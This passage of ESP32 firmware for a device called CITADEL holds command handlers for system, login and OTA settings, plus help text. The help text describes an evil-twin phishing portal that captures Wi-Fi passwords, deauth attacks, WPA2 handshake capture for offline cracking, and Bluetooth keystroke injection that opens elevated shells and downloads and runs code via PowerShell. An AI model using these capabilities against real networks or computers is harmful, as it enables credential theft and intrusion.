             "OLED FLIP: "+String(oledFlipped?"YES":"NO")+"<br>"
             "BANNER:    "+(sysBanner!=""?sysBanner:"(none)");
      goto done;
    }
    if (subUp=="PREFS RESET") {
      prefs.clear();
      result="<span class='yw'>ALL PREFERENCES WIPED. Rebooting...</span>";
      server.send(200,"text/html",result); delay(1000); ESP.restart(); return "";
    }
    if (subUp=="LOG") {
      result=terminalLog==""?"LOG EMPTY.":"<span class='cy'> LOG </span><br>"+htmlEncode(terminalLog);
      goto done;
    }
    if (subUp=="LOG CLEAR") { terminalLog=""; result="LOG CLEARED."; goto done; }
    if (subUp=="CRASH") {
      result="LAST CRASH: "+(crashReason!=""?crashReason:"NONE RECORDED");
      goto done;
    }

    if (subUp.startsWith("FREQ ")) {
      int f=sub.substring(5).toInt();
      if (f==80||f==160||f==240) { setClock(f); result="FREQ: "+String(f)+"MHz"; }
      else result="<span class='er'>VALID: 80 160 240</span>";
      goto done;
    }
    if (subUp.startsWith("BANNER ")) {
      sysBanner=parseQuotedArg(sub.substring(7),0);
      prefs.putString("banner",sysBanner);
      result="BANNER SET: "+sysBanner; goto done;
    }

    if (subUp=="TIME") {
      result="TIME:   "+getRealTime()+"<br>"
             "NTP:    "+String(ntpSynced?"SYNCED":"NOT SYNCED")+"<br>"
             "OFFSET: UTC"+String(ntpOffset>=0?"+":"")+String(ntpOffset);
      goto done;
    }
    if (subUp=="TIME SYNC") {
      if (!staConnected) { result="<span class='er'>STA not connected. Need internet for NTP.</span>"; goto done; }
      configTime(ntpOffset*3600,0,"pool.ntp.org");
      safeDelay(2000);
      ntpSynced=true;
      result="NTP SYNCED: "+getRealTime(); goto done;
    }
    if (subUp.startsWith("TIME ZONE ")) {
      ntpOffset=sub.substring(10).toInt();
      prefs.putInt("ntp_offset",ntpOffset);
      if (ntpSynced) configTime(ntpOffset*3600,0,"pool.ntp.org");
      result="TIMEZONE: UTC"+String(ntpOffset>=0?"+":"")+String(ntpOffset); goto done;
    }

    if (subUp=="STRESS") {
      result="<span class='cy'> STRESS TEST </span><br>";
      result+="Heap before: "+String(ESP.getFreeHeap()/1024)+"KB<br>";
      result+="GREEN  threshold: >120KB<br>";
      result+="YELLOW threshold: >80KB<br>";
      result+="ORANGE threshold: >50KB<br>";
      result+="RED    threshold: <50KB<br>";
      result+="Current: "+String(ESP.getFreeHeap()/1024)+"KB = "+healthName(currentHealth);
      goto done;
    }

    // PANEL
    if (subUp.startsWith("PANEL ")) {
      String m=subUp.substring(6); m.trim();
      if (m=="STATUS"||m=="WATCH"||m=="LOG"||m=="CLIENTS"||
          m=="ATTACK"||m=="PAYLOADS"||m=="PREFS"||m=="NETWORK"||
          m=="THERMAL"||m=="OFF") {
        panelMode=m;
        result="PANEL: "+m; goto done;
      }
      result="<span class='er'>OPTIONS: STATUS WATCH LOG CLIENTS ATTACK PAYLOADS PREFS NETWORK THERMAL OFF</span>"; goto done;
    }

    // OLED commands
    if (subUp=="STEALTH"||subUp=="OLED OFF") { oledMode=OLED_OFF; u8g2.clearBuffer(); u8g2.sendBuffer(); result="OLED OFF."; goto done; }
    if (subUp=="REVEAL"||subUp=="OLED ON")   { oledMode=OLED_STATUS; result="OLED RESTORED."; goto done; }
    if (subUp=="OLED STATUS")               { oledMode=OLED_STATUS;          result="OLED: STATUS";          goto done; }
    if (subUp=="OLED TERMINAL")             { oledMode=OLED_TERMINAL;         result="OLED: TERMINAL (FULL)"; goto done; }
    if (subUp=="OLED TERMINAL ALERTS")      { oledMode=OLED_TERMINAL_ALERTS;  result="OLED: TERMINAL (ALERTS)"; goto done; }
    if (subUp=="OLED TERMINAL OFF")         { oledMode=OLED_STATUS;           result="OLED: TERMINAL OFF";    goto done; }
    if (subUp=="OLED CLOCK")                { oledMode=OLED_CLOCK;            result="OLED: CLOCK";           goto done; }
    if (subUp=="OLED HEALTH")               { oledMode=OLED_HEALTH;           result="OLED: HEALTH";          goto done; }
    if (subUp=="OLED ATTACK")               { oledMode=OLED_ATTACK;           result="OLED: ATTACK";          goto done; }
    if (subUp=="OLED NETWORK")              { oledMode=OLED_NETWORK;          result="OLED: NETWORK";         goto done; }
    if (subUp=="OLED CLEAR")                { u8g2.clearBuffer(); u8g2.sendBuffer(); result="OLED CLEARED.";  goto done; }
    if (subUp=="OLED FLIP") {
      oledFlipped=!oledFlipped;
      u8g2.setDisplayRotation(oledFlipped?U8G2_R2:U8G2_R0);
      prefs.putBool("oled_flip",oledFlipped);
      result="OLED: "+(oledFlipped?String("FLIPPED"):String("NORMAL")); goto done;
    }
    if (subUp=="OLED MODE") {
      const char* modes[]={"STATUS","TERMINAL","TERM_ALERTS","CLOCK","MSG","SCROLL","HEALTH","ATTACK","NETWORK","OFF"};
      result="OLED MODE: "+String(modes[(int)oledMode]); goto done;
    }
    if (subUp.startsWith("OLED MSG ")) {
      oledCustomMsg=parseQuotedArg(sub.substring(9),0);
      if (oledCustomMsg=="") { result="<span class='er'>FORMAT: SYS OLED MSG \"text\"</span>"; goto done; }
      oledMode=OLED_MSG; result="OLED MSG SET."; goto done;
    }
    if (subUp.startsWith("OLED SCROLL ")) {
      oledScrollText=parseQuotedArg(sub.substring(12),0);
      if (oledScrollText=="") { result="<span class='er'>FORMAT: SYS OLED SCROLL \"text\"</span>"; goto done; }
      oledScrollPos=0; oledMode=OLED_SCROLL; result="OLED SCROLLING."; goto done;
    }
    if (subUp.startsWith("OLED BRIGHTNESS ")) {
      int b=constrain(sub.substring(16).toInt(),0,255);
      u8g2.setContrast(b); prefs.putInt("oled_bright",b);
      result="BRIGHTNESS: "+String(b); goto done;
    }

    result="<span class='er'>UNKNOWN SYS COMMAND. Type HELP SYS.</span>"; goto done;
  }

  //  AUTH 
  if (up.startsWith("AUTH")) {
    String sub   = raw.length()>5 ? raw.substring(5) : "";
    String subUp = sub; subUp.toUpperCase(); subUp.trim();

    if (subUp=="STATUS") {
      result="<span class='cy'> AUTH STATUS </span><br>"
             "AUTH:      "+String(authEnabled?"ENABLED":"DISABLED")+"<br>"
             "USER:      "+(authUser!=""?authUser:"(not set)")+"<br>"
             "TIMEOUT:   "+String(authTimeout)+" min<br>"
             "AUTORENEW: "+String(authAutoRenew?"ON":"OFF")+"<br>"
             "WHITELIST: "+String(whitelistEnabled?"ON":"OFF")+" ("+String(whitelistCount)+" IPs)<br>"
             "ACCOUNTS:  "+String(accountCount);
      goto done;
    }
    if (subUp=="ON")  { authEnabled=true;  prefs.putBool("auth_on",true);  result="AUTH ENABLED.";  goto done; }
    if (subUp=="OFF") { authEnabled=false; prefs.putBool("auth_on",false); result="AUTH DISABLED."; goto done; }
    if (subUp=="LOGOUT") { sessionToken=""; result="LOGGED OUT."; goto done; }
    if (subUp=="AUTORENEW ON")  { authAutoRenew=true;  result="AUTORENEW ON.";  goto done; }
    if (subUp=="AUTORENEW OFF") { authAutoRenew=false; result="AUTORENEW OFF."; goto done; }

    if (subUp=="RESET") {
      authUser=""; authPass=""; authEnabled=false; sessionToken="";
      prefs.putString("auth_user",""); prefs.putString("auth_pass","");
      prefs.putBool("auth_on",false);
      result="AUTH RESET."; goto done;
    }
    if (subUp.startsWith("USER ")) {
      String u=parseQuotedArg(sub.substring(5),0);
      if (u=="") { result="<span class='er'>FORMAT: AUTH USER \"username\"</span>"; goto done; }
      authUser=u; prefs.putString("auth_user",authUser); result="USERNAME SET."; goto done;
    }
    if (subUp.startsWith("PASSWORD ")) {
      String p=parseQuotedArg(sub.substring(9),0);
      if (p=="") { result="<span class='er'>FORMAT: AUTH PASSWORD \"password\"</span>"; goto done; }
      authPass=p; prefs.putString("auth_pass",authPass); result="PASSWORD SET."; goto done;
    }
    if (subUp.startsWith("TIMEOUT ")) {
      authTimeout=sub.substring(8).toInt(); prefs.putInt("auth_timeout",authTimeout);
      result="TIMEOUT: "+String(authTimeout)+" min"; goto done;
    }
    if (subUp=="LOG") { result=loginLog==""?"NO LOGIN ATTEMPTS.":"<span class='cy'> LOGIN LOG </span><br>"+htmlEncode(loginLog); goto done; }
    if (subUp=="LOCKOUT STATUS") {
      result="<span class='cy'> LOCKOUTS </span><br>";
      bool any=false;
      for (int i=0;i<loginAttemptCount;i++) {
        if (loginAttempts[i].lockUntil>millis()) {
          result+=loginAttempts[i].ip+" locked for "+String((loginAttempts[i].lockUntil-millis())/1000)+"s<br>";
          any=true;
        }
      }
      if (!any) result+="NONE."; goto done;
    }
    if (subUp=="LOCKOUT CLEAR") {
      for (int i=0;i<loginAttemptCount;i++) { loginAttempts[i].fails=0; loginAttempts[i].lockUntil=0; }
      result="LOCKOUTS CLEARED."; goto done;
    }
    if (subUp=="WHITELIST ON")  { whitelistEnabled=true;  result="WHITELIST ENABLED.";  goto done; }
    if (subUp=="WHITELIST OFF") { whitelistEnabled=false; result="WHITELIST DISABLED."; goto done; }
    if (subUp.startsWith("WHITELIST ADD ")) {
      String ip=parseQuotedArg(sub.substring(14),0);
      if (whitelistCount>=8) { result="<span class='er'>MAX 8 IPs.</span>"; goto done; }
      authWhitelist[whitelistCount++]=ip; result="WHITELISTED: "+ip; goto done;
    }
    if (subUp=="WHITELIST LIST") {
      result="<span class='cy'> WHITELIST </span><br>";
      for (int i=0;i<whitelistCount;i++) result+=authWhitelist[i]+"<br>";
      if (whitelistCount==0) result+="EMPTY."; goto done;
    }
    if (subUp.startsWith("ACCOUNT")) {
      String aArgs=sub.length()>8?sub.substring(8):""; aArgs.trim();
      String aUp=aArgs; aUp.toUpperCase();
      if (aUp=="LIST") {
        result="<span class='cy'> ACCOUNTS </span><br>";
        for (int i=0;i<accountCount;i++)
          result+=accounts[i].username+" ["+accounts[i].role+"]"+(accounts[i].locked?" LOCKED":"")+("<br>");
        if (accountCount==0) result+="NONE."; goto done;
      }
      if (aUp.startsWith("NEW ")) {
        String u=parseQuotedArg(aArgs.substring(4),0);
        String p=parseQuotedArg(aArgs.substring(4),1);
        String r=parseQuotedArg(aArgs.substring(4),2); r.toUpperCase();
        if (u==""||p==""||r=="") { result="<span class='er'>FORMAT: AUTH ACCOUNT NEW \"user\" \"pass\" ADMIN/USER/GUEST</span>"; goto done; }
        if (accountCount>=MAX_ACCOUNTS) { result="<span class='er'>MAX ACCOUNTS REACHED.</span>"; goto done; }
        accounts[accountCount]={u,p,r,false}; accountCount++; saveAccounts();
        result="ACCOUNT CREATED: "+u+" ["+r+"]"; goto done;
      }
      if (aUp.startsWith("DELETE ")) {
        String u=parseQuotedArg(aArgs.substring(7),0);
        for (int i=0;i<accountCount;i++) {
          if (accounts[i].username==u && accounts[i].role!="OWNER") {
            for (int j=i;j<accountCount-1;j++) accounts[j]=accounts[j+1];
            accountCount--; saveAccounts(); result="DELETED: "+u; goto done;
          }
        }
        result="<span class='er'>NOT FOUND or OWNER protected.</span>"; goto done;
      }
      if (aUp.startsWith("LOCK "))   { String u=parseQuotedArg(aArgs.substring(5),0); for(int i=0;i<accountCount;i++) if(accounts[i].username==u){accounts[i].locked=true; saveAccounts(); result="LOCKED: "+u; goto done;} result="NOT FOUND."; goto done; }
      if (aUp.startsWith("UNLOCK ")) { String u=parseQuotedArg(aArgs.substring(7),0); for(int i=0;i<accountCount;i++) if(accounts[i].username==u){accounts[i].locked=false;saveAccounts(); result="UNLOCKED: "+u; goto done;} result="NOT FOUND."; goto done; }
      result="<span class='er'>UNKNOWN ACCOUNT CMD. Type HELP AUTH.</span>"; goto done;
    }
    result="<span class='er'>UNKNOWN AUTH COMMAND. Type HELP AUTH.</span>"; goto done;
  }

  //  OTA 
  if (up.startsWith("OTA")) {
    String sub   = raw.length()>4 ? raw.substring(4) : "";
    String subUp = sub; subUp.toUpperCase(); subUp.trim();

    if (subUp=="STATUS") {
      result="<span class='cy'> OTA STATUS </span><br>"
             "ENABLED: "+String(otaEnabled?"YES ("+String((otaEnabledTime+300000-millis())/1000)+"s remaining)":"NO")+"<br>"
             "HOST:    citadel.local<br>"
             "AP:      "+WiFi.softAPIP().toString()+":3232<br>"
             "STA:     "+(staConnected?WiFi.localIP().toString()+":3232":"NOT CONNECTED")+"<br>"
             "WEB:     "+(otaEnabled?"192.168.4.1/update":"DISABLED  run OTA ENABLE")+"<br>"
             "VER:     v2.0.0";
      goto done;
    }
    if (subUp=="ENABLE") {
      killAllAttacks(false);
      addLog("[OTA] Pre-flash kill complete. Heap:"+String(ESP.getFreeHeap()/1024)+"KB");
      otaEnabled=true; otaEnabledTime=millis();
      result="<span class='yw'>OTA ENABLED</span><br>"
             "Web updater: 192.168.4.1/update<br>"
             "ArduinoOTA: citadel.local or "+WiFi.softAPIP().toString()+":3232<br>"
             "Auto-disables in 5 minutes.<br>"
             "Kill: <span class='yw'>OTA DISABLE</span>";
      goto done;
    }
    if (subUp=="DISABLE") { otaEnabled=false; result="OTA DISABLED."; goto done; }
    if (subUp.startsWith("PASSWORD ")) {
      String p=parseQuotedArg(sub.substring(9),0);
      if (p=="") { result="<span class='er'>FORMAT: OTA PASSWORD \"password\"</span>"; goto done; }
      otaPassword=p; prefs.putString("ota_pass",otaPassword);
      ArduinoOTA.setPassword(otaPassword.c_str());
      result="OTA PASSWORD SET."; goto done;
    }
   if (subUp=="RESTART") { server.send(200,"text/plain","REBOOTING FOR OTA..."); delay(500); ESP.restart(); return ""; }
    if (subUp.startsWith("GITHUB TOKEN ")) {
      String t=parseQuotedArg(sub.substring(13),0);
      if (t=="") { result="<span class='er'>FORMAT: OTA GITHUB TOKEN \"your_pat\"</span>"; goto done; }
      ghSaveToken(t);
      result="<span class='yw'>GH TOKEN SAVED.</span> Length: "+String(t.length())+" chars."; goto done;
    }
    if (subUp=="GITHUB TOKEN CLEAR") {
      prefs.remove("gh_token");
      result="<span class='yw'>GH TOKEN CLEARED.</span>"; goto done;
    }
    if (subUp=="GITHUB STATUS") {
      String tok=prefs.getString("gh_token","");
      result="<span class='cy'> GITHUB OTA </span><br>"
             "TOKEN:   "+(tok==""?"<span class='er'>NOT SET</span>":"<span class='yw'>SET ("+String(tok.length())+" chars)</span>")+"<br>"
             "CURRENT: v2.1.0<br>"
             "REPO:    ggreg04/CITADEL<br>"
             "STA:     "+(staConnected?WiFi.localIP().toString():"<span class='er'>NOT CONNECTED</span>");
      goto done;
    }
    if (subUp=="GITHUB CHECK") {
      if (!staConnected) { result="<span class='er'>STA not connected.</span>"; goto done; }
      server.send(200,"text/html","<span class='yw'>Checking GitHub...</span>");
      checkGithubOta();
      return "";
    }
    result="<span class='er'>UNKNOWN OTA COMMAND. Type HELP OTA.</span>"; goto done;
  }

  //  HELP 
  if (up=="HELP") {
    result="<span class='cy'>CITADEL v2.0.0  COMMAND REFERENCE</span><br>"
           "<br>"
           "<span class='yw'>WIFI</span>   Network, AP, STA, scanning<br>"
           "<span class='yw'>BT</span>     Bluetooth HID keyboard &amp; payloads<br>"
           "<span class='yw'>ATTACK</span> WiFi attacks, evil twin, deauth<br>"
           "<span class='yw'>SYS</span>    System health, OLED, storage, NTP<br>"
           "<span class='yw'>AUTH</span>   Login, accounts, whitelist, sessions<br>"
           "<span class='yw'>OTA</span>    Firmware updates over WiFi<br>"
           "<span class='yw'>ALIAS</span>  Custom command shortcuts<br>"
           "<br>"
           "Type <span class='yw'>HELP [namespace]</span> for commands<br>"
           "Type <span class='yw'>HELP [namespace] [command]</span> for detail";
    goto done;
  }
  if (up=="HELP WIFI") {
    result="<span class='cy'> WIFI COMMANDS </span><br>"
           "<span class='yw'>WIFI CONNECT \"SSID\" \"PASS\"</span><br>"
           "  Connect to a router. Saves to flash.<br>"
           "<span class='yw'>WIFI DISCONNECT</span>  drop STA<br>"
           "<span class='yw'>WIFI FORGET</span>  wipe saved credentials<br>"
           "<span class='yw'>WIFI STATUS</span>  full network readout<br>"
           "<span class='yw'>WIFI SCAN</span>  nearby networks with BSSID<br>"
           "<span class='yw'>WIFI IP</span>  all interface IPs<br>"
           "<span class='yw'>WIFI CLIENTS</span>  devices on CITADEL AP<br>"
           "<span class='yw'>WIFI AP NAME \"name\"</span>  rename hotspot<br>"
           "<span class='yw'>WIFI AP PASS \"pass\"</span>  change AP password<br>"
           "<span class='yw'>WIFI AP ON/OFF</span>  toggle hotspot<br>"
           "<span class='yw'>WIFI SNIFF ON/OFF</span>  monitor mode flag";
    goto done;
  }
  if (up=="HELP BT") {
    result="<span class='cy'> BT COMMANDS </span><br>"
           "<span class='yw'>BT ON</span>  start BLE keyboard (checks heap first)<br>"
           "<span class='yw'>BT OFF</span>  stop, frees memory<br>"
           "<span class='yw'>BT STATUS</span>  connection + heap info<br>"
           "<span class='yw'>BT PAIR</span>  pairing instructions + OLED<br>"
           "<span class='yw'>BT NAME \"name\"</span>  rename device<br>"
           "<span class='yw'>BT TYPE \"text\"</span>  type at cursor<br>"
           "<span class='yw'>BT NOTE/NOTE FULL/NOTE CLEAN</span><br>"
           "<span class='yw'>BT SAY \"text\" [SPEED] [STYLE] [WINDOW]</span><br>"
           "<span class='yw'>BT SHELL \"cmd\"</span>  Win+R, run command<br>"
           "<span class='yw'>BT URL \"url\"</span>  open URL via Run<br>"
           "<span class='yw'>BT DOWNLOAD \"url\"</span>  PowerShell download+run<br>"
           "<span class='yw'>BT ADMIN</span>  elevated cmd prompt<br>"
           "<span class='yw'>BT SEARCH \"text\"</span>  Windows search<br>"
           "<span class='yw'>BT SCREENSHOT</span>  Win+PrtScn<br>"
           "<span class='yw'>BT MINALL</span>  minimize all (Win+D)<br>"
           "<span class='yw'>BT LOCK</span>  Win+L<br>"
           "<span class='yw'>BT RICKROLL</span><br>"
           "<span class='yw'>BT MATRIX [n]</span>  random keypresses<br>"
           "<span class='yw'>BT MUTE / VOL UP / VOL DOWN</span><br>"
           "<span class='yw'>BT PAYLOAD</span>  see HELP BT PAYLOAD<br>"
           "See: <span class='yw'>HELP BT SAY  HELP BT NOTE  HELP BT PAYLOAD  HELP BT MEMORY</span>";
    goto done;
  }
  if (up=="HELP BT SAY") {
    result="<span class='cy'> BT SAY </span><br>"
           "Types text on the paired computer with options.<br><br>"
           "<span class='yw'>BT SAY \"text\" [SPEED] [STYLE] [WINDOW]</span><br><br>"
           "SPEED: SLOW(120ms) NORMAL(50ms) FAST(20ms) INSTANT<br>"
           "STYLE: NORMAL BOLD ITALIC BOLD+ITALIC CAPS<br>"
           "WINDOW: CURRENT NOTEPAD NOTEPAD+FULL MINIMIZE+NOTEPAD<br><br>"
           "Example:<br>"
           "BT SAY \"Hello World\" SLOW BOLD NOTEPAD+FULL<br>"
           "Opens Notepad maximized, applies bold, types slowly.";
    goto done;
  }
  if (up=="HELP BT NOTE") {
    result="<span class='cy'> BT NOTE </span><br>"
           "Opens Notepad on paired PC and types text.<br><br>"
           "<span class='yw'>BT NOTE \"text\"</span>  open Notepad, type<br>"
           "<span class='yw'>BT NOTE FULL \"text\"</span>  maximized<br>"
           "<span class='yw'>BT NOTE CLEAN \"text\"</span>  minimize all first<br>"
           "<span class='yw'>BT NOTE SAVE \"filename\"</span>  Ctrl+S, enter name<br><br>"
           "Example workflow:<br>"
           "BT NOTE CLEAN \"My message\"<br>"
           "BT NOTE SAVE \"output\"";
    goto done;
  }
  if (up=="HELP BT PAYLOAD") {
    result="<span class='cy'> BT PAYLOAD </span><br>"
           "Save keystroke sequences that fire on demand.<br>"
           "Survives reboot. Stored in flash.<br><br>"
           "<span class='yw'>BT PAYLOAD NEW \"name\"</span>  start recording<br>"
           "<span class='yw'>BT PAYLOAD STEP \"TYPE:text\" [delay]</span><br>"
           "<span class='yw'>BT PAYLOAD STEP \"KEY:ENTER\"</span><br>"
           "<span class='yw'>BT PAYLOAD STEP \"KEY:WIN+R\"</span><br>"
           "<span class='yw'>BT PAYLOAD STEP \"DELAY:1000\"</span><br>"
           "<span class='yw'>BT PAYLOAD SAVE</span>  finish recording<br>"
           "<span class='yw'>BT PAYLOAD RUN \"name\"</span>  execute<br>"
           "<span class='yw'>BT PAYLOAD LIST</span>  show all saved<br>"
           "<span class='yw'>BT PAYLOAD VIEW \"name\"</span>  inspect steps<br>"
           "<span class='yw'>BT PAYLOAD DELETE \"name\"</span><br><br>"
           "Available KEY values:<br>"
           "ENTER TAB ESC WIN+R WIN+L WIN+D";
    goto done;
  }
  if (up=="HELP BT MEMORY") {
    result="<span class='cy'> BT MEMORY GUIDE </span><br>"
           "BLE keyboard uses ~40KB of RAM when active.<br>"
           "ESP32 has ~300KB total. WiFi uses ~80KB.<br>"
           "Running both leaves limited headroom.<br><br>"
           "Safe to run BT+WiFi above 80KB free heap.<br>"
           "Below 60KB BT may crash or freeze.<br><br>"
           "Check heap: <span class='yw'>SYS TOP</span><br>"
           "Free memory: <span class='yw'>BT OFF</span><br>"
           "Monitor: <span class='yw'>SYS PANEL WATCH</span><br>"
           "Auto-kill fires at RED state (&lt;50KB).<br><br>"
           "If BT crashes: run SYS REBOOT, then BT ON.<br>"
           "If persistent: stop attacks first.";
    goto done;
  }
  if (up=="HELP ATTACK") {
    result="<span class='cy'> ATTACK COMMANDS </span><br>"
           "<span class='yw'>ATTACK SCAN</span><br>"
           "  Scans nearby networks. Shows SSID, BSSID,<br>"
           "  channel, signal, encryption. Use BSSID values<br>"
           "  as input for DEAUTH commands.<br><br>"
           "<span class='yw'>ATTACK EVILTWIN \"SSID\"</span><br>"
           "  Clones a WiFi network name as an open AP.<br>"
           "  Serves a fake login page styled for the<br>"
           "  victim's device (Android/iOS/Windows).<br>"
           "  Captures password attempts to flash.<br>"
           "  Kill: ATTACK EVILTWIN OFF or ATTACK STOP<br><br>"
           "<span class='yw'>ATTACK DEAUTH \"BSSID\" [\"CLIENT\"|CONTINUOUS]</span><br>"
           "  Sends deauth frames to kick devices off a network.<br>"
           "  BSSID = router MAC from ATTACK SCAN.<br>"
           "  CLIENT = specific device MAC, or omit for all.<br>"
           "  CONTINUOUS = keeps firing until ATTACK DEAUTH OFF.<br>"
           "  Combine with HANDSHAKE to capture WPA2 hash.<br><br>"
           "<span class='yw'>ATTACK HANDSHAKE \"BSSID\"</span><br>"
           "  Listens for WPA2 4-way handshake.<br>"
           "  Use DEAUTH to force reconnect and trigger it.<br>"
           "  View with ATTACK HANDSHAKE SHOW.<br>"
           "  Hash usable with hashcat -m 22000 offline.<br><br>"
           "<span class='yw'>ATTACK BEACON \"SSID\" [count]</span><br>"
           "  Broadcasts fake network names. Cosmetic only.<br>"
           "  Kill: ATTACK BEACON OFF<br><br>"
           "<span class='yw'>ATTACK CREDS</span>  view captured passwords<br>"
           "<span class='yw'>ATTACK CREDS CLEAR</span>  wipe captures<br>"
           "<span class='yw'>ATTACK CLIENTS</span>  devices on evil twin AP<br>"
           "<span class='yw'>ATTACK LOG</span>  timestamped attack history<br>"
           "<span class='yw'>ATTACK STATUS</span>  all active attack states<br>"
           "<span class='yw'>ATTACK THEME android/ios/windows/auto</span><br>"
           "<span class='yw'>ATTACK STOP</span>  kill ALL attacks instantly";
    goto done;
  }
  if (up=="HELP SYS") {
    result="<span class='cy'> SYS COMMANDS </span><br>"
           "<span class='yw'>SYS TOP</span>  CPU, temp, heap, health state<br>"
           "<span class='yw'>SYS HEALTH</span>  health state explained<br>"
           "<span class='yw'>SYS MEMORY</span>  detailed heap + flash<br>"
           "<span class='yw'>SYS THERMAL</span>  temp + history graph<br>"
           "<span class='yw'>SYS STORAGE</span>  payloads, aliases, flash<br>"
           "<span class='yw'>SYS PREFS</span>  all saved settings<br>"
           "<span class='yw'>SYS PREFS RESET</span>  factory wipe<br>"
           "<span class='yw'>SYS LOG</span>  terminal log history<br>"
           "<span class='yw'>SYS CRASH</span>  last crash reason<br>"
           "<span class='yw'>SYS FREQ [80|160|240]</span>  CPU speed<br>"
           "<span class='yw'>SYS BANNER \"text\"</span>  boot message<br>"
           "<span class='yw'>SYS TIME / TIME SYNC / TIME ZONE +/-N</span><br>"
           "<span class='yw'>SYS STRESS</span>  show heap thresholds<br>"
           "<span class='yw'>SYS PANEL [mode]</span>  control right panel<br>"
           "<span class='yw'>SYS OLED [mode]</span>  see HELP SYS OLED<br>"
           "<span class='yw'>SYS REBOOT / SYS CLEAR / SYS VERSION</span>";
    goto done;
  }
  if (up=="HELP SYS OLED") {
    result="<span class='cy'> SYS OLED MODES </span><br>"
           "<span class='yw'>SYS OLED STATUS</span>  temp, CPU, connection<br>"
           "<span class='yw'>SYS OLED TERMINAL</span>  mirror all commands<br>"
           "<span class='yw'>SYS OLED TERMINAL ALERTS</span>  key events only<br>"
           "<span class='yw'>SYS OLED TERMINAL OFF</span>  stop mirroring<br>"
           "<span class='yw'>SYS OLED CLOCK</span>  time, uptime, temp<br>"
           "<span class='yw'>SYS OLED HEALTH</span>  live health state<br>"
           "<span class='yw'>SYS OLED ATTACK</span>  attack status<br>"
           "<span class='yw'>SYS OLED NETWORK</span>  IPs, client count<br>"
           "<span class='yw'>SYS OLED MSG \"text\"</span>  custom message<br>"
           "<span class='yw'>SYS OLED SCROLL \"text\"</span>  marquee<br>"
           "<span class='yw'>SYS OLED BRIGHTNESS [0-255]</span><br>"
           "<span class='yw'>SYS OLED FLIP</span>  rotate 180 degrees<br>"
           "<span class='yw'>SYS OLED MODE</span>  show current mode<br>"
           "<span class='yw'>SYS STEALTH / SYS REVEAL</span>  OFF/ON";
    goto done;
  }
  if (up=="HELP AUTH") {
    result="<span class='cy'> AUTH COMMANDS </span><br>"
           "<span class='yw'>AUTH ON / AUTH OFF</span>  enable/disable login<br>"
           "<span class='yw'>AUTH USER \"u\"</span>  set owner username<br>"
           "<span class='yw'>AUTH PASSWORD \"p\"</span>  set owner password<br>"
           "<span class='yw'>AUTH STATUS</span>  auth state overview<br>"
           "<span class='yw'>AUTH TIMEOUT [min]</span>  session expiry (0=never)<br>"
           "<span class='yw'>AUTH AUTORENEW ON/OFF</span>  renew on activity<br>"
           "<span class='yw'>AUTH LOGOUT</span>  end current session<br>"
           "<span class='yw'>AUTH RESET</span>  wipe all credentials<br>"
           "<span class='yw'>AUTH LOG</span>  login attempt history<br>"
           "<span class='yw'>AUTH LOCKOUT STATUS</span>  locked IPs<br>"
           "<span class='yw'>AUTH LOCKOUT CLEAR</span>  clear lockouts<br>"
           "<span class='yw'>AUTH WHITELIST ON/OFF</span><br>"
           "<span class='yw'>AUTH WHITELIST ADD \"IP\"</span><br>"
           "<span class='yw'>AUTH WHITELIST LIST</span><br>"
           "<span class='yw'>AUTH ACCOUNT NEW \"u\" \"p\" ROLE</span><br>"
           "<span class='yw'>AUTH ACCOUNT LIST/DELETE/LOCK/UNLOCK</span><br>"
           "ROLES: OWNER ADMIN USER GUEST";
    goto done;
  }
  if (up=="HELP OTA") {
    result="<span class='cy'> OTA COMMANDS </span><br>"
           "<span class='yw'>OTA ENABLE</span><br>"
           "  Kills all attacks, exposes update endpoints.<br>"
           "  Auto-disables after 5 minutes.<br><br>"
           "<span class='yw'>OTA DISABLE</span>  hide OTA immediately<br>"
           "<span class='yw'>OTA STATUS</span>  IPs, ports, time remaining<br>"
           "<span class='yw'>OTA PASSWORD \"p\"</span>  set OTA password<br>"
           "<span class='yw'>OTA RESTART</span>  reboot into update state<br><br>"
           "Web updater: 192.168.4.1/update (when enabled)<br>"
           "ArduinoOTA: citadel.local or STA IP, port 3232<br><br>"
           "After flash: ESP32 reboots, reconnects to saved WiFi,<br>"
           "CITADEL AP comes back up within ~10 seconds.";
    goto done;
  }

  result="<span class='er'>UNKNOWN: "+htmlEncode(raw)+"<br>Type HELP</span>";

done:
  oledLastResp=stripHtml(result).substring(0,21);
  if (oledMode==OLED_TERMINAL_ALERTS) {
    // Only update OLED for significant events
    String upResult=result; upResult.toUpperCase();
    if (upResult.indexOf("CAPTURE")>=0||upResult.indexOf("PAIRED")>=0||
        upResult.indexOf("HEALTH")>=0||upResult.indexOf("WARN")>=0||
        upResult.indexOf("ERROR")>=0||upResult.indexOf("KILL")>=0)
      oledLastCmd=raw.substring(0,17);
  } else {
    oledLastCmd=raw.substring(0,17);
  }
  addLog(raw+"  "+stripHtml(result).substring(0,80));
  return result;
}
